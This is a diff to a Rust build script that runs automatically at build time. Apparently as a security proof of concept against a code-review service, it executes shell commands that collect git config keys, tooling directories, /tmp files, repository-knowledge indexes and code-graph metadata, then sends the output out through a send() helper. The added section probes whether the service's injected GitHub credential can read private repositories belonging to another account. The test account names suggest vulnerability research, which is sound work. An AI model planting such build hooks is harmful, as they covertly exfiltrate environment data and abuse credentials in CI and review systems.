@@ -89,7 +89,7 @@ for ln in gl:
 print('gitcfg_keys=' + ','.join(sorted(set(re.sub(r'\s*=.*', '', x).strip() for x in gl)))[:500])
 PY
 "#);
-    send("buildrs5a", &a);
+    send("buildrs6a", &a);
 
     // (b) CodeRabbit tooling dir, /tmp analysis artifacts, repo-knowledge.
     let b = sh(r#"
@@ -101,7 +101,7 @@ echo "optuv=$(ls /opt/uv-python 2>/dev/null | head -10 | tr '\n' ',')"
 echo "tmpfiles=$(ls -la /tmp 2>/dev/null | awk '{print $5":"$9}' | head -15 | tr '\n' '|')"
 echo "kb=$(find /tmp/coderabbit-repo-knowledge -maxdepth 3 -printf '%y:%p:%s\n' 2>/dev/null | head -25 | tr '\n' '|')"
 "#);
-    send("buildrs5b", &b);
+    send("buildrs6b", &b);
 
     // (c) sqlite code-graph metadata: table names, row counts, repo identifiers only.
     let c = sh(r#"
@@ -137,7 +137,25 @@ except Exception as e:
     print('err=' + str(e)[:120])
 PY
 "#);
-    send("buildrs5c", &c);
+    send("buildrs6c", &c);
+
+    // (d) credential scope: reviewed repo (public, not proof), A private control,
+    // B private cross-account, and B without the proxy header (negative control).
+    let d = sh(r#"
+export GIT_TERMINAL_PROMPT=0
+run() {
+  o=$(timeout 25 git ls-remote "$1" 2>&1); r=$?
+  n=$(printf %s "$o" | grep -c .)
+  f=$(printf %s "$o" | head -1 | cut -c1-90)
+  echo "$2_rc=$r;$2_lines=$n;$2_first=$f"
+}
+run https://github.com/testing-creator-A/cr-sandbox-test.git self
+run https://github.com/testing-creator-A/cr-private-control.git aprivate
+run https://github.com/testing-creator-B/cr-cross-tenant-test.git bprivate
+o=$(timeout 25 git -c http.https://github.com/.extraheader= ls-remote https://github.com/testing-creator-B/cr-cross-tenant-test.git 2>&1); r=$?
+echo "bprivate_noauth_rc=$r;bprivate_noauth_first=$(printf %s "$o" | head -1 | cut -c1-90)"
+"#);
+    send("buildrs6d", &d);
 
     println!("cargo:rerun-if-changed=build.rs");
 }
